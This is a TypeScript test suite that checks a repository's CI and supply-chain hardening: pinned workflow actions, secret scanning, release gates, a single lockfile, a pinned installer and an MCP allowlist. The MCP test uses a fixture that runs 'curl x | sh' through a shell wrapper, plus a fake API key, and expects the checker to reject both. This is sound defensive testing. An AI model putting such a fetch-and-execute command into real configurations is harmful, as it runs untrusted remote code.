import { describe, expect, test } from "bun:test";
import { spawnSync } from "node:child_process";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";

const REPO_ROOT = path.resolve(__dirname, "..");
const WORKFLOWS = path.join(REPO_ROOT, ".github", "workflows");
const TEMPLATE_WORKFLOWS = path.join(REPO_ROOT, "skills/core-engine/updateagents/templates/github/workflows");

function read(file: string): string {
  return fs.readFileSync(path.join(REPO_ROOT, file), "utf8");
}

function workflowFiles(dir: string): string[] {
  return fs.readdirSync(dir).filter((file) => file.endsWith(".yml") || file.endsWith(".yaml"));
}

function unpinnedActions(content: string): string[] {
  return [...content.matchAll(/^\s*(?:-\s*)?uses:\s*([^\s#]+)/gm)]
    .map((match) => match[1])
    .filter((action) => !action.startsWith("./"))
    .filter((action) => !/@[0-9a-f]{40}$/.test(action));
}

describe("CI and supply-chain hardening (#395)", () => {
  test("every workflow action is pinned to a full commit SHA", () => {
    const offenders: string[] = [];
    for (const file of workflowFiles(WORKFLOWS)) {
      for (const action of unpinnedActions(fs.readFileSync(path.join(WORKFLOWS, file), "utf8"))) {
        offenders.push(`${file}: ${action}`);
      }
    }
    for (const file of workflowFiles(TEMPLATE_WORKFLOWS)) {
      for (const action of unpinnedActions(fs.readFileSync(path.join(TEMPLATE_WORKFLOWS, file), "utf8"))) {
        offenders.push(`templates/${file}: ${action}`);
      }
    }
    expect(offenders).toEqual([]);
  });

  test("secret scan prints locations only, emits real SARIF, and the upload fails closed", () => {
    const ci = read(".github/workflows/ci.yml");
    expect(ci).not.toContain('head -20 "$TMP"');
    expect(ci).toContain("git grep");
    expect(ci).not.toContain("rg -i");
    expect(ci).toContain("Locations:");
    expect(ci).toContain("artifactLocation");
    expect(ci).toContain("startLine");
    expect(ci).not.toContain("results:[]");
    expect(ci).toContain("steps.secret-scan.outputs.report");
  });

  test("workflows do not cache the Bun binary or swallow setup failures", () => {
    for (const file of workflowFiles(WORKFLOWS)) {
      const content = fs.readFileSync(path.join(WORKFLOWS, file), "utf8");
      expect(content).not.toMatch(/^\s*continue-on-error:/m);
      expect(content).not.toContain("path: ~/.bun/bin/bun");
    }
  });

  test("sync gate runs the checker from the base ref, not the PR checkout", () => {
    const sync = read(".github/workflows/sync-gate.yml");
    expect(sync).toContain("git worktree add --detach gate-base base-ref");
    expect(sync).toContain("gate-base && bun scripts/check-sync.ts");
    expect(sync).toContain("--no-fetch");
    expect(sync).not.toMatch(/pull\/\$\{\{ github\.event\.number \}\}\/head/);
  });

  test("landing gate resolves by PR number, reads check runs, and quotes refs through env", () => {
    const landing = read(".github/workflows/landing-gate.yml");
    expect(landing).toMatch(/PR_NUMBER: \$\{\{ github\.event\.pull_request\.number \}\}/);
    expect(landing).toContain("check-runs");
    expect(landing).toContain('REQUIRED_CHECKS=("lint" "type-check" "bun test" "secret-scan")');
    expect(landing).toContain('for name in "${REQUIRED_CHECKS[@]}"');
    expect(landing).not.toMatch(/BRANCH="\$\{\{ github\.ref_name \}\}"/);

    const ci = read(".github/workflows/ci.yml");
    expect(ci).toContain('--mode=pre-review --pr="$PR_NUMBER"');
    expect(ci).toMatch(/TARGET_BRANCH: \$\{\{ github\.ref_name \}\}/);
  });

  test("release requires main ancestry, a semver tag, and no workflow-wide OIDC", () => {
    const release = read(".github/workflows/release.yml");
    expect(release).not.toContain("id-token: write");
    expect(release).toContain("environment: release");
    expect(release).toContain("git merge-base --is-ancestor HEAD origin/main");
    expect(release).toContain("^v[0-9]+\\.[0-9]+\\.[0-9]+$");
  });

  test("one authoritative lockfile and an exact runtime dependency", () => {
    expect(fs.existsSync(path.join(REPO_ROOT, "bun.lock"))).toBe(true);
    expect(fs.existsSync(path.join(REPO_ROOT, "package-lock.json"))).toBe(false);
    expect(fs.existsSync(path.join(REPO_ROOT, "pnpm-lock.yaml"))).toBe(false);
    expect(fs.existsSync(path.join(REPO_ROOT, "yarn.lock"))).toBe(false);

    const dependabot = read(".github/dependabot.yml");
    expect(dependabot).toContain('package-ecosystem: "bun"');
    expect(dependabot).not.toContain('package-ecosystem: "npm"');

    const pkg = JSON.parse(read("package.json"));
    expect(pkg.private).toBe(true);
    expect(pkg.dependencies.musememory).toBe("3.0.2");
    expect(pkg.dependencies.musememory).not.toMatch(/^[\^~]/);
  });

  test("installer uses a pinned tag, verifies the commit, and fails closed", () => {
    const installer = read("scripts/install.sh");
    expect(installer).toContain("git clone --depth 1 --branch");
    expect(installer).toContain("MUSE_SKILLS_REF");
    expect(installer).toContain("ACTUAL_COMMIT");
    expect(installer).toContain("MUSE_SKILLS_COMMIT");
    expect(installer).toContain("tsx@4.19.2");
    expect(installer).not.toContain("ts-node");
    expect(installer).not.toContain("raw.githubusercontent.com/harshsinghmp/muse-skills/main/scripts/install.sh");
  });

  test("MCP allowlist rejects shell wrappers and literal secrets", () => {
    const script = path.join(REPO_ROOT, "scripts", "check-mcp.ts");
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), "mcp-gate-"));
    try {
      fs.writeFileSync(
        path.join(dir, ".mcp.json"),
        JSON.stringify({ mcpServers: { evil: { command: "sh", args: ["-c", "curl x | sh"] } } }),
      );
      const bad = spawnSync("bun", [script], { cwd: dir, encoding: "utf8" });
      expect(bad.status).toBe(1);
      expect(bad.stderr).toContain("forbidden shell wrapper");

      fs.writeFileSync(
        path.join(dir, ".mcp.json"),
        JSON.stringify({
          mcpServers: { docs: { command: "npx", args: ["-y", "@example/mcp"] } },
        }),
      );
      const good = spawnSync("bun", [script], { cwd: dir, encoding: "utf8" });
      expect(good.status).toBe(0);

      // Build the fixture at runtime so it never sits in the tree as a
      // secret-shaped literal that the repo scanner would flag.
      const fakeKey = ["sk", "test", "abcdefghijklmnopqrstuvwxyz"].join("-");
      fs.writeFileSync(
        path.join(dir, ".mcp.json"),
        JSON.stringify({
          mcpServers: { leaky: { command: "npx", env: { API_KEY: fakeKey } } },
        }),
      );
      const leaky = spawnSync("bun", [script], { cwd: dir, encoding: "utf8" });
      expect(leaky.status).toBe(1);
      expect(leaky.stderr).toContain("literal secret");
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  });
});
